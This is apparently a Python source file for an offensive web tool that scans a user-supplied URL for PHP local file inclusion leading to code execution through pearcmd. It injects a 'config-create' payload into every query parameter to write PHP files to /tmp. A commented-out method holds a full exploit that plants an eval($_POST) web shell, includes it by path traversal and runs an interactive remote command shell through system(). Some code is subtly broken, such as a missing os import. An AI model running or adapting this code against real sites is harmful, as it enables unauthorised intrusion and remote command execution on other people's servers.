import re
import ssl
import socket
import requests
import urllib.parse
import concurrent.futures

from rich.console import Console
from rich.progress import Progress
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class PHPPearCmdChecker():
    def __init__(self, url, silent=False):
        self.url = url
        self.silent = silent
        self.console = Console()
        self.PEARCMD_FILEPATHS = self.load_file_paths('wordlists/pearcmd.txt')

    def load_file_paths(self, filepath):
        file_path = []
        with open(filepath, 'r') as f:
            for line in f:
                file_path.append(line.strip())
        return file_path        

    def pearcmd_check(self):
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        file_paths = self.PEARCMD_FILEPATHS
        with Progress(console=self.console) as progress:
            return self._scan(params, file_paths, parsed_url, progress)
            
    def _send_raw_request(self, url, method='GET', headers=None, use_ssl=False, data=None):
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        port = parsed_url.port if parsed_url.port else (443 if use_ssl else 80)

        request_line = "{} {} HTTP/1.1\r\n".format(method, parsed_url.path + '?' + parsed_url.query)
        headers = headers or {}
        headers['Host'] = host
        headers['User-Agent'] = 'Mozilla/5.0'
        

        if data is not None:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = len(data)

        headers['Connection'] = 'closed'
        headers_raw = "".join(["{}: {}\r\n".format(k, v) for k, v in headers.items()])
        request = request_line + headers_raw + "\r\n"

        if data is not None:
            request += data + "\r\n"

        try:
            sock = socket.create_connection((host, port))
            if use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.sendall(request.encode())
            response = ""
            while True:
                data = sock.recv(4096)
                if data:
                    response += data.decode('utf-8', 'ignore')
                else:
                    break
            return response

        except Exception as e:
            self.console.print("\nError while sending request:", e)
            return None


    def _scan(self, params, file_paths, parsed_url, progress=None):
        shared_results = []
        stop_signal = False
        print_message = False
        total_tasks = len(params.keys()) * len(file_paths)
        task = progress.add_task("[cyan]Scanning...", total=total_tasks) if progress else None

        def send_request(file_path, param_name):
            nonlocal shared_results, stop_signal
            if stop_signal:
                return

            new_params = params.copy()
            new_params[param_name] = f'{file_path}&+config-create+/<?=phpinfo();?>+/tmp/phpinfo'
            new_query = '&'.join([f'{k}={v}' for k, v in new_params.items()])
            fuzzed_url = f'{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}'

            response = self._send_raw_request(fuzzed_url, use_ssl=parsed_url.scheme == "https")

            if response and "CHANNEL PEAR.PHP.NET" in response:
                shared_results.append(True)

            if progress:
                progress.update(task, advance=1)

        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(send_request, file_path, param_name)
                    for file_path in file_paths for param_name in params.keys()]

            for future in as_completed(futures):
                if not future.result():
                    stop_signal = True
                    break

        if any(shared_results):
            print_message = True

        if print_message and not self.silent:
            self.console.print(f'\n[bold red]Possible LFI2RCE (php_pearcmd: method)[/bold red]', style='bold red')

        if any(shared_results):
            for param_name in params.keys():
                new_params = params.copy()
                new_params[param_name] = '/tmp/phpinfo'
                new_query = '&'.join([f'{k}={v}' for k, v in new_params.items()])
                included_url = f'{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}'
                self.console.print(f"\n[bold green]URL for included file (using param '{param_name}'): {included_url}[/bold green]")

        return any(shared_results), None






    def run_shell(self, param_name):
        self.console.print("[bold red][X] Exploit is in WIP because complexity of attack D: [/bold red]")
        return 
        '''self.silent = True
        parsed_url = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed_url.query)
        new_params = params.copy()
        depths = ['/', '../' * 10]
        
        new_params[param_name] = f"{self.file_path}&+config-create+/<?=eval($_POST[test]);?>+/tmp/lftest"
        new_query = urllib.parse.urlencode(new_params, doseq=True, safe=':+')
        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
        use_ssl = parsed_url.scheme == "https"
        headers = { 'User-Agent': 'Mozilla/5.0' }

        try:
            response = self._send_raw_request(fuzzed_url, headers=headers, use_ssl=use_ssl)
        except Exception as e:
            self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
            print(e)
            return False, None

        
        for depth in depths:
            new_params[param_name] = f'{depth}tmp/lftest'
            new_query = urllib.parse.urlencode(new_params, doseq=True, safe=':+')
            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query)) 
            print(fuzzed_url)
            data = "test=echo [; echo S; echo ]; echo [; echo E;"

            try:
                response = self._send_raw_request(fuzzed_url, method='POST', headers=headers, use_ssl=use_ssl, data=data)
                match = re.search(r'\[S\](.*?)\[E\]', response)
                if match:
                    session = PromptSession(history=InMemoryHistory())        
                    while True:
                        try:
                            cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                        
                            if "exit" in cmd:
                                raise KeyboardInterrupt
                            elif not cmd:
                                continue
                            elif "clear" in cmd:
                                if os.name == 'posix':
                                    os.system('clear')
                            elif os.name == 'nt':
                                os.system('cls')                                                             
                            if cmd.lower() in ["exit", "quit"]:
                                break
                            
                            cmd = f"test=echo '['; echo 'S]'; system('{cmd}'); echo '[E]';"
                            try:
                                response = self._send_raw_request(fuzzed_url, method='POST', headers=headers, use_ssl=use_ssl, data=cmd)
                            except Exception as e:
                                self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                                print(e)
                            
                            pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                            response_content = pattern.search(response)
                            if response_content:
                                shell_output = response_content.group(1)
                                self.console.print(f"[bold green]{shell_output}[/bold green]")
                            else:
                                self.console.print("[bold red]No shell output.[/bold red]")
                                
                        except KeyboardInterrupt:
                                self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
                                break   
                            
            except Exception as e:
                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
                    print(e)
                    return False, None'''
       
            
                

def main():
    url = input('Enter site URL to test: ')
    checker = PHPPearCmdChecker(url, silent=True)
    output, param_name = checker.pearcmd_check()
    
    if output is not None:
        checker.run_shell(param_name)
    

if __name__ == "__main__":
    main()
